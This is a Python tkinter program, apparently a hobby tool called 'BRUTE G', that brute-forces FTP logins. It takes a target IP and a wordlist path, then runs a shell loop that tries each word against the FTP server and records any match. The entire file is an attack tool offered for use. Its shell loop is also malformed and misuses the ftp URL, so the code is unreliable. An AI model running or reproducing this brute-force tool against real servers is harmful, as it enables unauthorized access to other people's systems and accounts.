
from tkinter import *
import subprocess as s
#main window
win=Tk()
win.geometry("800x600")
win.config(bg="gray13")
win.title("")

#directory making
s.getoutput("""
mkdir bruteG
cd bruteG
touch ip.txt
touch path.txt
touch result.txt


""")


#main fuction the ftp attacking
def mainfun():
    h2 = path.get()
    z = ip.get()
    #file writing
    text1 = open("/home/kali/bruteG/ip.txt", "w")
    for i in z:
        text1.write(i)
    print(text1)
    text1.close()
    text2 = open("/home/kali/bruteG/path.txt", "w")
    for i in h2:
        text2.write(i)
    text2.close()
    #attacking process on the base of shell script
    process = s.getoutput("""
                ft=$(cat /home/kali/bruteG/path.txt)
                x=$(cat /home/kali/bruteG/ip.txt)
                echo $x
                while read i in a
                do  
                    ftp -in ftp://$i@$x
                    if test $? -eq 0
                    then

                    	printf "\n THE FTP PASSWORD IS : $i \n"
                    	echo  IP: $x THE PASSWORD :$i > /home/kali/bruteG/result.txt

                    else
                    	printf "\n WRONG PASSWORD : $i \n"
                    	echo NO PASSWORDS ARE MATCH  > /home/kali/bruteG/result.txt
                    fi

                    echo $fi
                done < $ft || echo "ENTER A VALID IP OR VALID PATH" > /home/kali/bruteG/result.txt """)

    resulttext=open("/home/kali/bruteG/result.txt", "r")
    result=resulttext.read()
    l2=Label(win, text=result, width=40, height=2, bg="white", font=("bold", 15))
    l2.place(x=150, y=300)
    print(process)
#tkinter gui
l1=Label(text="BRUTE G", width=7, height=1, bg="gray13", fg="white", font=("bold", 20))
l1.place(x=320, y=2)
b=Button(bg="orange", fg="black", text="START ATTACK", font=("bold", 15), command=mainfun)
b.place(x=290, y=210)
path=Entry(bg="white")
path.place(x=290,y=160)
ip=Entry(fg="black", bg="white")
ip.place(x=292, y=100)
l2=Label(text="ENTER TARGET IP", bg="gray13", fg="white")
l2.place(x=320, y=70)
l2=Label(text="SELECT THE WORD FILE PATH", bg="gray13", fg="white")
l2.place(x=283, y=133)
print(ip.get())
l3=Label(text="""
created by Greejith-k
greejith9809@gamil.com""", bg="gray13", fg="white", font=("bold", 7))
l3.place(x=310, y=500)
win.mainloop()
